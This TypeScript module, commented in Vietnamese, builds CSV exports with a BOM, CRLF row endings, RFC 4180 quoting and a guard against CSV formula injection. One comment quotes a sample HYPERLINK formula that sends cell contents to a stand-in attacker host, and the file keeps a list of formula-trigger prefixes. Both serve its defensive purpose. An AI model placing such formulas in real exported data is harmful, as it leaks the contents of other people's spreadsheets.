/**
 * Dựng nội dung CSV — hàm THUẦN, tầng 1 (xem `docs/kien-truc-ung-dung.md` §4).
 *
 * Ở tầng 1 vì phần khó của việc xuất CSV không nằm ở vòng lặp mà ở ba chi tiết dưới đây, và cả ba
 * đều là lỗi CHỈ lộ ra trên máy người dùng. Để chúng nội tuyến trong từng trang thì mỗi trang sẽ
 * tự làm sai một kiểu; đặt ở đây thì mỗi cái bẫy có đúng một test khoá lại.
 *
 * Phần `Blob` + thẻ `<a download>` + `revokeObjectURL` CỐ Ý ở lại nơi gọi: đó là DOM, tầng 1 không
 * được đụng tới, và mỗi trang tự đặt tên tệp theo nghiệp vụ của nó.
 *
 * ── BẪY 1: THIẾU BOM → MỌI DẤU TIẾNG VIỆT THÀNH KÝ TỰ LẠ ─────────────────────────────────────
 * Phần mềm bảng tính trên Windows KHÔNG đoán UTF-8. Không có BOM thì nó đọc tệp theo bảng mã hệ
 * thống (CP1252/CP1258) và mọi dấu tiếng Việt vỡ thành ký tự lạ. Máy lập trình viên mở tệp bằng
 * trình soạn thảo mặc định UTF-8 nên KHÔNG BAO GIỜ thấy — lỗi này chỉ tồn tại ở phía người dùng,
 * và nó là lỗi kinh điển của CSV tiếng Việt. Vì vậy `toCsv` luôn ghi BOM và không có cờ để tắt.
 *
 * ── BẪY 2: Ô BẮT ĐẦU BẰNG `=` `+` `-` `@` LÀ CÔNG THỨC ───────────────────────────────────────
 * Xem JSDoc của `escapeCsvCell`. Đây là lỗ hổng, không phải lỗi hiển thị.
 *
 * ── BẪY 3: XUỐNG DÒNG PHẢI LÀ CRLF ───────────────────────────────────────────────────────────
 * RFC 4180 quy định `\r\n`, và cái giá của việc chọn sai là bất đối xứng: mọi bộ đọc CSV đều hiểu
 * CRLF, còn `\n` trần thì có bộ hiểu có bộ không (bản Excel cũ trên Windows gộp cả tệp thành MỘT
 * dòng). Chọn thứ ai cũng đọc được, đừng chọn thứ máy mình đọc được.
 */

/**
 * Byte Order Mark của UTF-8, ký tự U+FEFF.
 *
 * ⚠ PHẢI viết bằng escape `"\uFEFF"`, TUYỆT ĐỐI không dán ký tự thật vào chuỗi. `pnpm core:check`
 * chặn mọi ký tự ngoài ASCII trong string literal của `lib/core/`, mà U+FEFF là ký tự VÔ HÌNH —
 * dán nhầm thì script báo đỏ ở một dòng trông hoàn toàn bình thường, và người đọc không có cách
 * nào nhìn ra chỗ sai bằng mắt.
 */
export const UTF8_BOM = "\uFEFF";

/** Dấu ngăn dòng theo RFC 4180 — xem "BẪY 3" ở đầu file trước khi đổi. */
const ROW_SEPARATOR = "\r\n";

/**
 * Bốn ký tự mở đầu khiến phần mềm bảng tính coi cả ô là công thức.
 *
 * Danh sách này là tập ĐÃ ĐỦ cho Excel và Google Sheets. OWASP còn nêu ký tự tab và `\r` đứng đầu
 * ô ở vài phiên bản cũ; ở đây hai ca đó rơi vào luật bọc nháy kép bên dưới, nhưng ĐỪNG nhầm rằng
 * bọc nháy là đã vô hiệu hoá — xem cảnh báo trong `escapeCsvCell`.
 */
const FORMULA_PREFIXES: ReadonlySet<string> = new Set(["=", "+", "-", "@"]);

/** Ký tự nào xuất hiện Ở BẤT KỲ ĐÂU trong ô cũng buộc phải bọc ô đó lại. */
const QUOTE_TRIGGERS: ReadonlySet<string> = new Set([",", '"', "\r", "\n"]);

/**
 * Ô cần bọc nháy kép khi chứa dấu phẩy, nháy kép, xuống dòng, hoặc bắt đầu/kết thúc bằng khoảng
 * trắng.
 *
 * ⚠ CỐ Ý viết bằng hàm chứ không bằng một regex gọn hơn. Bộ kiểm `pnpm core:check` bóc comment
 * bằng một máy trạng thái KHÔNG biết tới regex literal, nên một dấu nháy kép nằm trong lớp ký tự
 * của regex bị nó hiểu là MỞ một chuỗi — từ đó nó lệch pha tới hết file và báo đỏ ở những dòng
 * comment hoàn toàn vô can (đã đo: 4 lỗi giả, không dòng nào trỏ đúng chỗ). Bẫy này đúng cho MỌI
 * regex chứa nháy trong `lib/core/`. Ngày nào bộ kiểm hiểu được regex thì đây là chỗ rút gọn lại.
 *
 * Đổi lại được một thứ thật: hàm thì không có cờ `g` để ai đó thêm vào. `RegExp.test` với cờ `g`
 * NHỚ `lastIndex` giữa các lần gọi, nên cùng một ô lúc trả `true` lúc trả `false` tuỳ vào ô đứng
 * ngay trước nó — lỗi phụ thuộc thứ tự, và một test gọi hàm đúng một lần sẽ không bao giờ thấy.
 */
function needsQuoting(value: string): boolean {
  if (value === "") return false;

  // Khoảng trắng ở hai đầu: `trim()` rỗng nghĩa là ký tự đó là khoảng trắng, kể cả tab.
  const [first = ""] = value;
  const last = value.slice(-1);
  if (first.trim() === "" || last.trim() === "") return true;

  for (const char of value) {
    if (QUOTE_TRIGGERS.has(char)) return true;
  }
  return false;
}

/**
 * Thoát MỘT ô: vô hiệu hoá công thức TRƯỚC, rồi mới bọc theo RFC 4180.
 *
 * ── 1. CHỐNG CSV INJECTION ───────────────────────────────────────────────────────────────────
 * Ô bắt đầu bằng `=`, `+`, `-` hoặc `@` được Excel/Sheets hiểu là CÔNG THỨC chứ không phải văn
 * bản. Một người dùng đặt tên công việc là `=HYPERLINK("https://ke-tan-cong/?d="&A1,"Bao cao")`
 * thì công thức đó chạy trên máy của NGƯỜI KHÁC — người tải tệp về. Dữ liệu do người dùng nhập trở
 * thành mã thực thi ở một máy thứ ba; đó là lỗ hổng, không phải lỗi hiển thị. Cách vô hiệu hoá tiêu
 * chuẩn là chèn một dấu nháy đơn ở đầu ô.
 *
 * ⚠ BỌC NHÁY KÉP KHÔNG CỨU ĐƯỢC. `"=1+1"` trong tệp vẫn được Excel tính ra `2`: nháy kép là quy
 * tắc của ĐỊNH DẠNG TỆP (phân tách ô), còn "đây là công thức" là quyết định phần mềm bảng tính đưa
 * ra SAU khi phân tách xong. Hai tầng khác nhau — đừng thay việc này bằng việc kia.
 *
 * ⚠ Cái giá phải trả, và nó CÓ THẬT: `-5` cũng bắt đầu bằng `-`, nên số âm cũng bị chèn nháy và
 * thành VĂN BẢN trong bảng tính. Đánh đổi này là cố ý — hỏng theo kiểu THẤY ĐƯỢC (ô căn trái, cộng
 * không ra) vẫn tốt hơn hỏng theo kiểu im lặng chạy mã trên máy người khác. Cần cột số cộng được
 * thì CSV không phải định dạng đúng; dùng XLSX với kiểu ô thật.
 *
 * ⚠ Dấu nháy đơn NẰM TRONG byte của tệp. Phần mềm bảng tính coi nó là dấu hiệu "ô này là văn bản"
 * nên không hiện ra, nhưng một CHƯƠNG TRÌNH đọc lại tệp sẽ nhận `'=…`. Nghĩa là hàm này KHÔNG khứ
 * hồi: nó dựng tệp cho NGƯỜI đọc, không phải kênh trao đổi dữ liệu giữa hai máy.
 *
 * ── 2. BỌC THEO RFC 4180 ─────────────────────────────────────────────────────────────────────
 * Bọc nháy kép khi ô chứa dấu phẩy, nháy kép, xuống dòng, hoặc bắt đầu/kết thúc bằng khoảng trắng;
 * nháy kép bên trong được NHÂN ĐÔI. Khoảng trắng đầu/cuối không bắt buộc phải bọc theo RFC, nhưng
 * nhiều bộ phân tích tự cắt nó đi — bọc lại là cách duy nhất nói rằng khoảng trắng đó là dữ liệu.
 *
 * ⚠ Hàm này KHÔNG idempotent, và không thể idempotent: `a,b` → `"a,b"` là ô đã thoát, gọi lần nữa
 * ra `"""a,b"""` là một ô hợp lệ mang nội dung khác. Thoát đúng MỘT lần, ở đúng chỗ này.
 */
export function escapeCsvCell(value: string): string {
  const [first = ""] = value;
  const guarded = FORMULA_PREFIXES.has(first) ? `'${value}` : value;

  if (!needsQuoting(guarded)) return guarded;
  return `"${guarded.replaceAll('"', '""')}"`;
}

/**
 * Các dòng → một chuỗi CSV hoàn chỉnh, CÓ BOM ở đầu và ngăn dòng bằng CRLF.
 *
 * Nhận MỘT danh sách dòng chứ không tách `headers` khỏi `rows`: dòng tiêu đề tuân theo đúng luật
 * thoát như mọi dòng khác, nên tách ra chỉ tạo thêm một nhánh mã và một cách quên thoát. Nhãn cột
 * là chuỗi hiển thị, đến từ `messages/*.json` ở tầng giao diện — chúng PHẢI đi vào đây bằng tham
 * số, vì tầng 1 không được biết ngôn ngữ nào đang bật.
 *
 * Mảng rỗng cho ra ĐÚNG một BOM: một tệp rỗng hợp lệ, mở lên bằng bảng tính là một trang trắng.
 *
 * Cố ý KHÔNG có CRLF ở cuối tệp. RFC 4180 cho phép cả hai, nhưng nhiều bộ phân tích đọc dòng trống
 * cuối cùng thành một BẢN GHI RỖNG — tức bảng nhiều hơn đúng một dòng ma mà không ai giải thích nổi.
 */
export function toCsv(rows: readonly (readonly string[])[]): string {
  return UTF8_BOM + rows.map((row) => row.map(escapeCsvCell).join(",")).join(ROW_SEPARATOR);
}
